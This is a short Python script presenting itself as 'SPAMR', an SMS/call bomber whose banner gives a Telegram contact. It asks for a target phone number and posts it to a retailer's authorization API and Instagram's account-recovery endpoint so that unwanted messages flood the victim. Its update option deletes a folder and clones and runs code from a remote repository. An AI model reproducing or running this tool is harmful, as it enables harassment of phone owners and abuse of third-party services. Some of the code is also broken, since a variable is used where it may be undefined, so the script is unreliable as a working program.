import os                                    
import random
import time
import requests
from termcolor import colored                   

# Дефы:
# Дефы:
def connected_to_internet(url='http://www.google.com/', timeout=5):
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        logo()
        print("\u001b[33m[!] \u001b[31mNo internet connection available.\033[0m\n")
        time.sleep(2)
        os.system("python spamr.py")
    return False

def delay():
    time.sleep(_delay)

def logo():
    os.system("clear")
    print("\u001b[33m       ____  ____   _    __  __ ____      ")
    print("\u001b[33m      / ___||  _ \ / \  |  \/  |  _ \     ")
    print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")     
    print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")    
    print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
    print("\u001b[33m                    v0.2                  ")
    print("\u001b[33m                                          ")
    print("\u001b[32m   SMS/Call bomber. \u001b[34mTelegram: @BreadToBad\033[0m ")
    print("                                          ")        

def clear():
    os.system("clear")


# Начало кода:
# Начало кода:


_delay = "0"

logo()
print("\u001b[41m\u001b[32mMENU\u001b[49m:\n\u001b[33m[1]\u001b[32m SMS BOMBER.\n\u001b[33m[2]\u001b[32m UPDATE SPAMR.\n\u001b[33m[3]\u001b[32m ABOUT.\n\u001b[33m[4] \u001b[32mEXIT.\n")
menu = input("\u001b[33mEnter your choice: \033[0m")

if menu == "1" or menu == "2" or menu == "3" or menu == "4":
    pass
else:
    os.system("python spamr.py")
if menu == "2":
    clear()
    connected_to_internet()
    print("\u001b[33mWait, this may take a few minutes...\n\033[0m")
    os.system("pkg install git && cd && rm -rf spamr && git clone https://github.com/kirill2281337227/spamr && apt install python")
    clear()
    print("\u001b[33mSuccessfully updated!\n\033[0m")
    time.sleep(3)
    os.system("cd && cd spamr && python spamr.py")

if menu == "3":
    logo()
    print("\u001b[34mДо кнопки 'About'\nу меня еще не дошли руки. \u001b[33mxD")
    exit()

if menu == "4":
    logo()
    print("\u001b[33mExit!")
    print("")
    exit()

if menu == "1":
    logo()
    connected_to_internet()
    _phone = input("\u001b[31mEnter number:\033[0m ")

    if len(_phone) == 11 or len(_phone) == 12 or len(_phone) == 13:
        pass
    else:
        logo()
        print("\u001b[33m[!] \u001b[31mIncorrect number!\033[0m")
        time.sleep(2)
        os.system("python spamr.py")

if menu == "1":
    _delay = int(input("\u001b[31mEnter delay:\033[0m "))
    logo()

a  = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
print("Message sent >> {0}.".format(a))
delay()
c = requests.post("https://www.instagram.com/accounts/accounts_recovery_send_ajax", data={"email_or_username": _phone, "recaptcha_challenge_field": ""})
print(c)
exit()
